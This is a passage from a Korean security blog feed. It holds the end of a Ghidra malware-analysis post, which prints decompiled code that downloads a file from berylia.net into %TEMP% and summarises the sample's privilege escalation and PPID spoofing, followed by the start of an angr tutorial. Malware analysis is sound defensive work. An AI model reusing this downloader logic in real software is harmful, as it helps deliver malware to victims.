*)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetSetOptionW&quot;</span>);          local_54 = local_54 | <span class="hljs-number">0x1180</span>;          (*InternetSetOptionW_addr)(local_24,<span class="hljs-number">0x1f</span>,&amp;local_54,<span class="hljs-number">4</span>);        &#125;        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        HttpSendRequestA_addr = (HttpSendRequestA *)GetProcAddress(hModule,<span class="hljs-string">&quot;HttpSendRequestA&quot;</span>);        local_34 = (*HttpSendRequestA_addr)(local_24,(LPCSTR)<span class="hljs-number">0x0</span>,<span class="hljs-number">0</span>,(LPVOID)<span class="hljs-number">0x0</span>,<span class="hljs-number">0</span>);        local_38 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">16000</span>);        <span class="hljs-built_in">memset</span>(local_38,<span class="hljs-number">0</span>,<span class="hljs-number">16000</span>);        <span class="hljs-built_in">memset</span>(DAT_00416024,<span class="hljs-number">0</span>,<span class="hljs-number">0x1000</span>);        temp_path = getenv(<span class="hljs-string">&quot;TEMP&quot;</span>);        temp_path_len = <span class="hljs-built_in">strlen</span>(temp_path);        DAT_00416028 = (LPCSTR)<span class="hljs-built_in">malloc</span>(temp_path_len + <span class="hljs-number">0x1000</span>);        <span class="hljs-built_in">strcpy</span>(DAT_00416028,temp_path);        uVar6 = <span class="hljs-number">0xffffffff</span>;        pcVar7 = DAT_00416028;        <span class="hljs-keyword">do</span> &#123;          <span class="hljs-keyword">if</span> (uVar6 == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;          uVar6 = uVar6 - <span class="hljs-number">1</span>;          cVar1 = *pcVar7;          pcVar7 = pcVar7 + <span class="hljs-number">1</span>;        &#125; <span class="hljs-keyword">while</span> (cVar1 != <span class="hljs-string">&#x27;\0&#x27;</span>);        puVar5 = (undefined4 *)(DAT_00416028 + (~uVar6 - <span class="hljs-number">1</span>));        *puVar5 = <span class="hljs-number">0x4154415c</span>;        puVar5[<span class="hljs-number">1</span>] = <span class="hljs-number">0x70554950</span>;        puVar5[<span class="hljs-number">2</span>] = <span class="hljs-number">0x2e727464</span>;        puVar5[<span class="hljs-number">3</span>] = <span class="hljs-number">0x657865</span>;        MultiByteToWideChar(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,DAT_00416028,<span class="hljs-number">-1</span>,DAT_00416024,<span class="hljs-number">0x1000</span>);        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);        CreateFileW_addr = (CreateFileW *)GetProcAddress(hModule,<span class="hljs-string">&quot;CreateFileW&quot;</span>);        local_44 = (*CreateFileW_addr)(DAT_00416024,<span class="hljs-number">0xc0000000</span>,<span class="hljs-number">0</span>,(LPSECURITY_ATTRIBUTES)<span class="hljs-number">0x0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x80</span>,                                       (HANDLE)<span class="hljs-number">0x0</span>);        local_5c = <span class="hljs-number">0</span>;        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        InternetReadFile_addr = (InternetReadFile *)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetReadFile&quot;</span>);        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);        WriteFile_addr = (WriteFile *)GetProcAddress(hModule,<span class="hljs-string">&quot;WriteFile&quot;</span>);        <span class="hljs-keyword">if</span> (local_34 == <span class="hljs-number">0</span>) &#123;          uVar3 = <span class="hljs-number">0xe</span>;        &#125;        <span class="hljs-keyword">else</span> &#123;          local_60 = <span class="hljs-number">0</span>;          <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) &#123;            WVar4 = (*InternetReadFile_addr)(local_24,local_38,<span class="hljs-number">0x2000</span>,&amp;local_60);            <span class="hljs-keyword">if</span> ((WVar4 == <span class="hljs-number">0</span>) || (local_60 == <span class="hljs-number">0</span>)) &#123;              bVar2 = <span class="hljs-literal">false</span>;            &#125;            <span class="hljs-keyword">else</span> &#123;              bVar2 = <span class="hljs-literal">true</span>;            &#125;            <span class="hljs-keyword">if</span> (!bVar2) <span class="hljs-keyword">break</span>;            (*WriteFile_addr)(local_44,local_38,local_60,&amp;local_5c,(LPOVERLAPPED)<span class="hljs-number">0x0</span>);          &#125;          hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);          InternetCloseHandle_addr =               (InternetCloseHandle *)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetCloseHandle&quot;</span>);          CloseHandle(local_44);          (*InternetCloseHandle_addr)(local_14);          (*InternetCloseHandle_addr)(local_1c);          (*InternetCloseHandle_addr)(local_24);          uVar3 = <span class="hljs-number">1</span>;        &#125;      &#125;    &#125;  &#125;  <span class="hljs-keyword">return</span> uVar3;&#125;</code></pre><p>상당히 기네요… 나눠서 살펴보아야 할 것 같습니다. 중요한 부분만 뽑아내서 살펴보도록 합시다.</p><pre><code class="hljs cpp">InternetConnectW_addr = (InternetConnectW *)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetConnectW&quot;</span>);local_1c = (*InternetConnectW_addr)           (local_14,<span class="hljs-string">L&quot;berylia.net&quot;</span>,<span class="hljs-number">0x1bb</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);</code></pre><p>위에서 문자열을 살펴볼 때 나왔던 <code>berylia.net</code>이 여기서 나오네요. <code>InternetConnectW</code>로 해당 주소에 연결합니다.</p><pre><code class="hljs cpp">HttpOpenRequestW_addr = (HttpOpenRequestW *)GetProcAddress(hModule,<span class="hljs-string">&quot;HttpOpenRequestW&quot;</span>);local_24 = (*HttpOpenRequestW_addr)           (local_1c,<span class="hljs-string">L&quot;GET&quot;</span>,<span class="hljs-string">L&quot;/index/&quot;</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR *)<span class="hljs-number">0x0</span>,            <span class="hljs-number">0x800000</span>,<span class="hljs-number">1</span>);</code></pre><p>그리고 GET Request를 보내네요. 음. 대충 예상을 해보면 request를 통해 파일을 다운로드한다라는 가정을 세울 수 있겠습니다. 밑에를 더 확인해볼까요?</p><pre><code class="hljs cpp">temp_path = getenv(<span class="hljs-string">&quot;TEMP&quot;</span>);temp_path_len = <span class="hljs-built_in">strlen</span>(temp_path);DAT_00416028 = (LPCSTR)<span class="hljs-built_in">malloc</span>(temp_path_len + <span class="hljs-number">0x1000</span>);<span class="hljs-built_in">strcpy</span>(DAT_00416028,temp_path);</code></pre><p>환경변수에 설정되어 있는 TEMP 폴더의 경로를 받아오네요. 위에 정보에서 더 추가를 해보면 temp 경로에 파일을 저장한다.</p><pre><code class="hljs cpp">MultiByteToWideChar(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,DAT_00416028,<span class="hljs-number">-1</span>,DAT_00416024,<span class="hljs-number">0x1000</span>);hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);CreateFileW_addr = (CreateFileW *)GetProcAddress(hModule,<span class="hljs-string">&quot;CreateFileW&quot;</span>);local_44 = (*CreateFileW_addr)(DAT_00416024,<span class="hljs-number">0xc0000000</span>,<span class="hljs-number">0</span>,(LPSECURITY_ATTRIBUTES)<span class="hljs-number">0x0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x80</span>,                               (HANDLE)<span class="hljs-number">0x0</span>);local_5c = <span class="hljs-number">0</span>;hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);InternetReadFile_addr = (InternetReadFile *)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetReadFile&quot;</span>);hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);WriteFile_addr = (WriteFile *)GetProcAddress(hModule,<span class="hljs-string">&quot;WriteFile&quot;</span>);<span class="hljs-keyword">if</span> (local_34 == <span class="hljs-number">0</span>) &#123;    uVar3 = <span class="hljs-number">0xe</span>;&#125;<span class="hljs-keyword">else</span> &#123;    local_60 = <span class="hljs-number">0</span>;    <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) &#123;        WVar4 = (*InternetReadFile_addr)(local_24,local_38,<span class="hljs-number">0x2000</span>,&amp;local_60);        <span class="hljs-keyword">if</span> ((WVar4 == <span class="hljs-number">0</span>) || (local_60 == <span class="hljs-number">0</span>)) &#123;            bVar2 = <span class="hljs-literal">false</span>;        &#125;        <span class="hljs-keyword">else</span> &#123;            bVar2 = <span class="hljs-literal">true</span>;        &#125;        <span class="hljs-keyword">if</span> (!bVar2) <span class="hljs-keyword">break</span>;        (*WriteFile_addr)(local_44,local_38,local_60,&amp;local_5c,(LPOVERLAPPED)<span class="hljs-number">0x0</span>);&#125;</code></pre><p>어김없이 예상은 적중합니다. <code>InternetReadFile</code>을 통해서 파일을 읽어와 <code>%TEMP%</code>에 <code>CreateFile</code>을 하는군요. 저장되는 파일의 이름은 무엇일까…</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%207.png"></p><p><code>ATAPIUpdtr.exe</code> 파일이네요.</p><h1 id="정리"><a href="#정리" class="headerlink" title="정리"></a>정리</h1><p>자 이제 정리를 해봅시다. 큼직큼직한 행위를 간단하게 정리하면 다음과 같아요.</p><ol><li><code>lsass.exe</code>의 PID를 가져온다.</li><li>Token을 활용해 권한을 상승시킨다.</li><li>PPID Spoofing을 진행한다.</li><li><code>berylia.net</code>에서 <code>ATAPIUpdtr.exe</code>를 <code>%TEMP%</code>에 다운로드한다.</li><li>실행!</li></ol><p>어… 너무 간단하네요. 하핫! 음… <del>어떻게 끝내야 하지?</del> 이번 파트는 저의 예상이 틀리지 않았음을 보여주는 부분이었던 거 같아요. ghidra의 활용법에 집중하기보다는 악성코드 분석이 우선이 되었던 것 같습니다. (사용하는 기능이 똑같아서 어쩔 수 없어요.) Malware analysis 파트를 1로 끝냈으면 좋았을 텐데…</p><p>아무튼! 그래도 오랫동안 글을 작성했네요. 도움이 되셨으면 좋겠습니다만… 저는 미개한 실력을 가지고 있는 사람이라서… ㅠㅠ… ghidra 파트는 더 다룰 부분이 없는 것 같아 이제 종료하려고 합니다! 다다음주에 악성코드 분석 VM 자동화의 마지막 파트도 업로드되니 기다려 주세용~ 그럼 이만!</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/malware/">malware</category>
      
      <category domain="https://hackyboiz.github.io/tags/reversing/">reversing</category>
      
      <category domain="https://hackyboiz.github.io/tags/ghidra/">ghidra</category>
      
      <category domain="https://hackyboiz.github.io/tags/ransomware/">ransomware</category>
      
      <category domain="https://hackyboiz.github.io/tags/ghidra-tutorials/">ghidra tutorials</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/11/idioth/ghidra_part5/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 핵린이의 angr 정복기 - (1) 시작</title>
      <link>https://hackyboiz.github.io/2021/07/10/j0ker/angr_part1/</link>
      <guid>https://hackyboiz.github.io/2021/07/10/j0ker/angr_part1/</guid>
      <pubDate>Sat, 10 Jul 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;인사말&quot;&gt;&lt;a href=&quot;#인사말&quot; class=&quot;headerlink&quot; title=&quot;인사말&quot;&gt;&lt;/a&gt;인사말&lt;/h1&gt;&lt;p&gt;안녕하세요! j0ker입니다. 아직 내공이 많이 부족해 그냥 공부만 하고 있다가 이제야 공부하고 있는 내용을 포스팅해볼</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="인사말"><a href="#인사말" class="headerlink" title="인사말"></a>인사말</h1><p>안녕하세요! j0ker입니다. 아직 내공이 많이 부족해 그냥 공부만 하고 있다가 이제야 공부하고 있는 내용을 포스팅해볼까 합니다!! 내가 왔다아아아아아악!!!!</p><p><img src="/2021/07/10/j0ker/angr_part1/1625546988.gif" alt="두두등장"></p><blockquote><p>우아씨 떨어질 뻔했네;;</p></blockquote><p>예전에 해킹하기 전에 영화 같은거 보면 해커들이 나와서 키보드를 촤라라라락 누르더니 지도에 점이 찍히고 취약점 알아서 찾고 공격까지 하는 장면을 본 적이 있습니다 ㅋㅋㅋㅋ 지금 보면 말이 안되는데 말이지… 그래도 그 때는 두근두근하면서 “오 해커는 정말 멋지다”라는 생각을 했었습니다. 그리고 이렇게 잘못된 길로 들어와 버렸죠… 허허 그 때 멈췄어야 했습니다.</p><p><img src="/2021/07/10/j0ker/angr_part1/2e17a20210794aa3b3831a38fad04184.jpeg" alt="2"></p><blockquote><p>얘도 그 때 “그 반지”만 받지 않았더라면…</p></blockquote><p>암튼 제가 봤던 그 영화 속에 해커에 좀 더 다가갈 수 있도록 해줄 수 있는 툴이 바로 angr이지 않을까 싶습니다. 그래서 angr를 공부하려고 하니까 다 라이트업만 있지 처음부터 끝까지 다루는 내용은 별로 없더라구요.(있으면 댓글 남겨주시면 감사하겠습니다! 내가 못 찾는건가…?) 시리즈를 일단 4편까지 쓸까 고민하고 있는데 내용을 다루면서 개념적인 부분이나 잘 다루지 않는 angr의 기초적인 내용에 대해서 또 다루다보면 길어질 수도 있겠습니다 ㅎㅎ</p><p>사실 이미 많이 유명한 툴이라 설명이 더 필요할까 싶긴한데 오늘 준비한 내용은 많지 않으니 주저리주저리 설명을 하고 가도록 하겠습니다 ^^</p><h1 id="angr란"><a href="#angr란" class="headerlink" title="angr란?"></a>angr란?</h1><p>angr는 다양한 환경에서 활용 가능한 바이너리 분석 플랫폼 입니다. angr가 유명해지기 시작한 것은 2015년 DARPA의 CGC(Cyber Grand Challenge)가 시작하면서죠. CGC는 참여팀이 바이너리를 자동 분석하는 툴을 만들어 제한 시간 내에 출제된 문제들에 취약점이 있음을 증명하고 패치하는 점수를 얻는 대회 입니다. 일반적인 CTF와는 다르죠? angr를 제작한 Shellphish팀이 이 대회에 참가하였고 3등을 차지했습니다. 대회가 끝나고 자동 취약점 분석 분야가 해커들에게 많은 주목을 받으면서 angr라는 툴 역시 python을 기반으로 한 높은 접근성 때문에 많은 인기를 끌기 시작했습니다. 다른 팀들이 제작한 바이너리 자동 분석 툴들도 공개된 것들이 있지만 angr가 python으로 활용 가능하다는 점과 문서화 잘 되어 있다는 점이 확실히 매력적으로 다가오는 거 같습니다. 그러니까 저 같은 핵린이들도 바이너리 자동분석을 찍먹해볼 수 있는거겠죠. CGC 이후로 많은 CTF에서 자동 취약점 분석 및 익스플로잇 혹은 리버싱 분야에서 angr를 활용할 수 있는 문제들이 나오고 해커들이 angr를 익숙하게 다룰 수 있게 되면서 보편적으로 많이 쓰이게 된 거 같습니다.(카더라)</p><p>angr, CGC, shellphish에 대해서 좀 더 자세하게 알고 싶으시다면 아래 링크를 참고해보시면 좋을듯 합니다.</p><ul><li><a href="https://cpuu.postype.com/post/4127178">[번역] 2016 DARPA CGC 대회 출전팀의 회고</a></li><li><a href="https://shellphish.net/cgc/">The Cyber Grand Challenge</a></li><li><a href="http://kaishackgon.blogspot.com/2016/08/cyber-grand-challenge.html">Cyber Grand Challenge 후기</a></li><li><a href="https://www.krcert.or.kr/data/trendView.do?bulletin_writing_sequence=20050">美 방위고등연구계획국(DARPA)의 사이버 자동 방어시스템 개발을 위한 컨테스트(CGC) 개최</a></li></ul><h1 id="angr-설치"><a href="#angr-설치" class="headerlink" title="angr 설치"></a>angr 설치</h1><p>위에서 말씀드렸다시피 angr는 다양한 환경에서 활용 가능합니다. 이게 뭔 말이냐? python만 깔리면 다 쓸 수 있다는 겁니다! 다 쓸 수 있다고는 하지만 저희는 일단 우분투에서 angr를 사용하도록 하겠습니다.</p><p>먼저 아래 명령어를 실행해서 실행에 필요한 기본적인 요소들을 설치합니다.</p><pre><code class="hljs bash">sudo apt-get install python3-dev libffi-dev build-essential virtualenvwrapper</code></pre><p>그리고 다른 모듈과의 버전 충돌을 방지하기 위해 virtualenv를 만들고 그 안에 angr를 설치해줍니다.</p><pre><code class="hljs bash">mkvirtualenv --python=$(<span class="hljs-built_in">which</span> python3) angr &amp;&amp; pip install angr</code></pre><p>만약 설치가 잘 안된다!!! 그러면 정직하게 <a href="https://docs.angr.io/introductory-errata/install">오피셜 문서</a>를 참고해주세요.</p><h1 id="angr-톺아보기"><a href="#angr-톺아보기" class="headerlink" title="angr 톺아보기"></a>angr 톺아보기</h1><p>이제 angr를 어떻게 사용하는지 알아봐야겠죠? 오늘은 정말 그냥 이런게 있구나~ 정도만 보고 다음에 좀 더 자세하게 앞으로 다뤄볼 예시 문제 상황에 따라 알아보도록 하겠습니다.</p><h2 id="Project"><a href="#Project" class="headerlink" title="Project"></a>Project</h2><p>일단 아래와 같이 기본적인 프로젝트를 생성합니다.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> angr<span class="hljs-meta">&gt;&gt;&gt; </span>proj = angr.Project(<span class="hljs-string">&#x27;00_angr_find&#x27;</span>)</code></pre><p>이렇게 하면 타겟 바이너리에 대한 Project 오브젝트가 생성됩니다. 이 프로젝트가 angr에서 해당 바이너리에 대한 정보를 제어하는 기본 단위가 됩니다.</p><p>먼저 바이너리에 대한 기본적인 정보들을 확인할 수 있습니다.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.arch&lt;Arch X86 (LE)&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>proj.entry<span class="hljs-number">134513744</span><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> monkeyhex<span class="hljs-meta">&gt;&gt;&gt; </span>proj.entry<span class="hljs-number">0x8048450</span></code></pre><p>중간에 monkeyhex를 import하면 그냥 10진수로 출력되는 값들이 16진수로 출력되서 좀 더 편하게 확인할 수 있습니다.</p><p>당연히 이 뿐만 아니라 다른 정보들도 있겠죠! 함 보겠습니다.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.__dict__&#123;<span class="hljs-string">&#x27;filename&#x27;</span>: <span class="hljs-string">&#x27;00_angr_find&#x27;</span>, <span class="hljs-string">&#x27;loader&#x27;</span>: &lt;Loaded <span class="hljs-number">00</span>_angr_find, maps [<span class="hljs-number">0x8048000</span>:<span class="hljs-number">0x8407fff</span>]&gt;, <span class="hljs-string">&#x27;arch&#x27;</span>: &lt;Arch X86 (LE)&gt;, <span class="hljs-string">&#x27;_sim_procedures&#x27;</span>: &#123;<span class="hljs-number">0x8100000</span>: &lt;SimProcedure strcmp&gt;,  <span class="hljs-number">0x8100004</span>: &lt;SimProcedure printf&gt;,  <span class="hljs-number">0x8100008</span>: &lt;SimProcedure __stack_chk_fail&gt;,  <span class="hljs-number">0x810000c</span>: &lt;SimProcedure puts&gt;,  <span class="hljs-number">0x8100010</span>: &lt;SimProcedure exit&gt;,  <span class="hljs-number">0x8100014</span>: &lt;SimProcedure __libc_start_main&gt;,  <span class="hljs-number">0x8100018</span>: &lt;SimProcedure __isoc99_scanf&gt;,  <span class="hljs-number">0x10301000</span>: &lt;SimProcedure LinuxLoader&gt;,  <span class="hljs-number">0x10301008</span>: &lt;SimProcedure _dl_rtld_lock_recursive&gt;,  <span class="hljs-number">0x10301010</span>: &lt;SimProcedure _dl_rtld_unlock_recursive&gt;,  <span class="hljs-number">0x10301018</span>: &lt;SimProcedure ReturnUnconstrained&gt;,  <span class="hljs-number">0x10301020</span>: &lt;SimProcedure _dl_initial_error_catch_tsd&gt;,  <span class="hljs-number">0x10301028</span>: &lt;SimProcedure _vsyscall&gt;,  <span class="hljs-number">0x10301038</span>: &lt;SimProcedure CallReturn&gt;,  <span class="hljs-number">0x10301040</span>: &lt;SimProcedure UnresolvableJumpTarget&gt;,  <span class="hljs-number">0x10301048</span>: &lt;SimProcedure UnresolvableCallTarget&gt;&#125;, <span class="hljs-string">&#x27;concrete_target&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;_default_analysis_mode&#x27;</span>: <span class="hljs-string">&#x27;symbolic&#x27;</span>, <span class="hljs-string">&#x27;_exclude_sim_procedures_func&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;_exclude_sim_procedures_list&#x27;</span>: (), <span class="hljs-string">&#x27;use_sim_procedures&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;_ignore_functions&#x27;</span>: [], <span class="hljs-string">&#x27;_support_selfmodifying_code&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;_translation_cache&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;_executing&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;entry&#x27;</span>: <span class="hljs-number">0x8048450</span>, <span class="hljs-string">&#x27;storage&#x27;</span>: &#123;&#125;, <span class="hljs-string">&#x27;store_function&#x27;</span>: &lt;bound method Project._store of &lt;Project \\\\Mac\\Home\\Desktop\\Angr_Tutorial_For_CTF\\problems\\<span class="hljs-number">00</span>_angr_find&gt;&gt;, <span class="hljs-string">&#x27;load_function&#x27;</span>: &lt;function Project._load at <span class="hljs-number">0x00000225ECEF2CA0</span>&gt;, <span class="hljs-string">&#x27;factory&#x27;</span>: &lt;angr.factory.AngrObjectFactory object at <span class="hljs-number">0x00000225ECEF4100</span>&gt;, <span class="hljs-string">&#x27;_analyses_preset&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;analyses&#x27;</span>: &lt;angr.analyses.analysis.AnalysesHub object at <span class="hljs-number">0x00000225ED698A00</span>&gt;, <span class="hljs-string">&#x27;kb&#x27;</span>: &lt;angr.knowledge_base.knowledge_base.KnowledgeBase object at <span class="hljs-number">0x00000225ED698C70</span>&gt;, <span class="hljs-string">&#x27;simos&#x27;</span>: &lt;angr.simos.linux.SimLinux object at <span class="hljs-number">0x00000225ED698A90</span>&gt;, <span class="hljs-string">&#x27;is_java_project&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;is_java_jni_project&#x27;</span>: <span class="hljs-literal">False</span>&#125;</code></pre><p>아… 모르는게 많네요… 하하… 저걸 다 공부해야 한다고??</p><p><img src="/2021/07/10/j0ker/angr_part1/1625553299.gif" alt="3" title="야레야레..."></p><blockquote><p>야레야레…</p></blockquote><p>하나씩 알아가보도록 하죠… 흐흐…</p><h2 id="loader"><a href="#loader" class="headerlink" title="loader"></a>loader</h2><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader&lt;Loaded <span class="hljs-number">00</span>_angr_find, maps [<span class="hljs-number">0x8048000</span>:<span class="hljs-number">0x8407fff</span>]&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.shared_objects&#123;<span class="hljs-string">&#x27;00_angr_find&#x27;</span>: &lt;ELF Object <span class="hljs-number">00</span>_angr_find, maps [<span class="hljs-number">0x8048000</span>:<span class="hljs-number">0x804a03f</span>]&gt;, <span class="hljs-string">&#x27;extern-address space&#x27;</span>: &lt;ExternObject Object cle<span class="hljs-comment">##externs, maps [0x8200000:0x8207fff]&gt;, </span><span class="hljs-string">&#x27;cle##tls&#x27;</span>: &lt;ELFTLSObjectV2 Object cle<span class="hljs-comment">##tls, maps [0x8300000:0x8314807]&gt;&#125;</span><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.min_addr<span class="hljs-number">0x8048000</span><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.max_addr<span class="hljs-number">0x8407fff</span><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.main_object&lt;ELF Object <span class="hljs-number">00</span>_angr_find, maps [<span class="hljs-number">0x8048000</span>:<span class="hljs-number">0x804a03f</span>]&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.main_object.execstack<span class="hljs-literal">False</span><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.main_object.pic<span class="hljs-literal">False</span></code></pre><p>loader에서는 바이너리가 메모리에 어떻게 매핑되는지에 대한 정보를 가지고 있습니다. angr에서는 CLE라는 모듈을 통해 바이너리를 메모리 주소에 매핑한 다음, loader에 메모리 주소 정보들을 저장한다고 합니다. 지금은 그저 “loader를 통해 바이너리가 메모리에 매핑된 주소나 미티게이션 적용 여부를 알 수 있다” 정도만 알면 될듯 합니다!</p><h2 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h2><p>angr에서는 지원하는 기능이 어<del>~</del>ㅁ청 많기 때문에 코드들이 난잡해지는 것을 막기 위해서 자주 사용하는 기능들을 factory라는 클래스에 넣어놨습니다.</p><h3 id="block"><a href="#block" class="headerlink" title="block"></a>block</h3><p>앞에서는 메모리에 바이너리가 매핑되었는지를 알았으니 이제 해당 주소에 있는 내용을 알아볼겁니다. black 오브젝트는 특정 주소의 명령어 블럭을 확인할 수 있습니다.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>block = proj.factory.block(proj.entry)<span class="hljs-meta">&gt;&gt;&gt; </span>block.pp()<span class="hljs-number">0x8048450</span>:      xor     ebp, ebp<span class="hljs-number">0x8048452</span>:      pop     esi<span class="hljs-number">0x8048453</span>:      mov     ecx, esp<span class="hljs-number">0x8048455</span>:      <span class="hljs-keyword">and</span>     esp, <span class="hljs-number">0xfffffff0</span><span class="hljs-number">0x8048458</span>:      push    eax<span class="hljs-number">0x8048459</span>:      push    esp<span class="hljs-number">0x804845a</span>:      push    edx<span class="hljs-number">0x804845b</span>:      push    <span class="hljs-number">0x8048710</span><span class="hljs-number">0x8048460</span>:      push    <span class="hljs-number">0x80486b0</span><span class="hljs-number">0x8048465</span>:      push    ecx<span class="hljs-number">0x8048466</span>:      push    esi<span class="hljs-number">0x8048467</span>:      push    <span class="hljs-number">0x80485c7</span><span class="hljs-number">0x804846c</span>:      call    <span class="hljs-number">0x8048420</span><span class="hljs-meta">&gt;&gt;&gt; </span>block.instructions<span class="hljs-number">0xd</span><span class="hljs-meta">&gt;&gt;&gt; </span>block.instruction_addrs[<span class="hljs-number">0x8048450</span>, <span class="hljs-number">0x8048452</span>, <span class="hljs-number">0x8048453</span>, <span class="hljs-number">0x8048455</span>, <span class="hljs-number">0x8048458</span>, <span class="hljs-number">0x8048459</span>, <span class="hljs-number">0x804845a</span>, <span class="hljs-number">0x804845b</span>, <span class="hljs-number">0x8048460</span>, <span class="hljs-number">0x8048465</span>, <span class="hljs-number">0x8048466</span>, <span class="hljs-number">0x8048467</span>, <span class="hljs-number">0x804846c</span>]</code></pre><p>이처럼 명령어를 보고 싶은 주소를 인자를 주면 원하는 코드 블럭에 있는 명령어들을 확인할 수 있습니다. 명령어의 데이터 형식을 볼 수도 있고 명령어 각각의 주소도 확인할 수 있습니다.</p><h3 id="state"><a href="#state" class="headerlink" title="state"></a>state</h3><p>Project 오브젝트는 프로그램 초기상태의 정적인 정보를 담고 있습니다. 그냥 정적인 데이터만 가지고는 프로그램이 실행하면서 값이 어떻게 변하는지를 확인할 수는 없겠죠? 그래서 angr에서는 프로그램이 실행되는 것처럼 시뮬레이션을 할 수 있고 이 과정을 SimState라는 오브젝트를 통해 확인하거나 조작할 수 있습니다.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>state = proj.factory.entry_state()<span class="hljs-meta">&gt;&gt;&gt; </span>state.regs.eip&lt;BV32 <span class="hljs-number">0x8048450</span>&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>state.regs.eax&lt;BV32 <span class="hljs-number">0x1c</span>&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>state.mem[proj.entry].int.resolved&lt;BV32 <span class="hljs-number">0x895eed31</span>&gt;</code></pre><p>지금은 엔트리 포인트에서의 레지스터와 메모리 상태를 알 수 있습니다. 근데 레지스터 값을 확인하면 그냥 인티저 값이 아닌거 같네요?</p><p>angr에서는 메모리나 레지스터의 값을 bitvector 형식으로 저장한다고 합니다. 일반적으로 32비트나 64비트 레지스터는 최대값이 넘어가면 0으로 되면서 오버플로우가 발생하잖아요? 근데 아시겠지만 파이썬의 인티저는 그런게 없죠! 오버플로우 따위는 웬만하면 일어나지 않습니다. 그렇기 때문에 32비트와 64비트 bitvector를 활용하게 됩니다.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bv = state.solver.BVV(<span class="hljs-number">0x1234</span>, <span class="hljs-number">32</span>)&lt;BV32 <span class="hljs-number">0x1234</span>&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>state.solver.eval(bv)<span class="hljs-number">0x1234</span><span class="hljs-meta">&gt;&gt;&gt; </span>state.regs.rsi = state.solver.BVV(<span class="hljs-number">3</span>, <span class="hljs-number">64</span>)<span class="hljs-meta">&gt;&gt;&gt; </span>state.regs.rsi&lt;BV64 <span class="hljs-number">0x3</span>&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>state.mem[<span class="hljs-number">0x1000</span>].long = <span class="hljs-number">4</span><span class="hljs-meta">&gt;&gt;&gt; </span>state.mem[<span class="hljs-number">0x1000</span>].long.resolved&lt;BV64 <span class="hljs-number">0x4</span>&gt;</code></pre><p>이런식으로 bitvector↔ integer를 왔다갔다 타입변환을 할 수도 있습니다. 그리고 타입을 지정해서 값을 저장할 수도 있죠.</p><h3 id="Simulation-manager"><a href="#Simulation-manager" class="headerlink" title="Simulation_manager"></a>Simulation_manager</h3><p>state를 통해 어디서 시뮬레이션을 할지를 지정했다면 Simulation_manager를 통해서는 지정한 state를 기준으로 실행하면서 어떻게 데이터들이 바뀌어 나가는지 확인해 볼 수 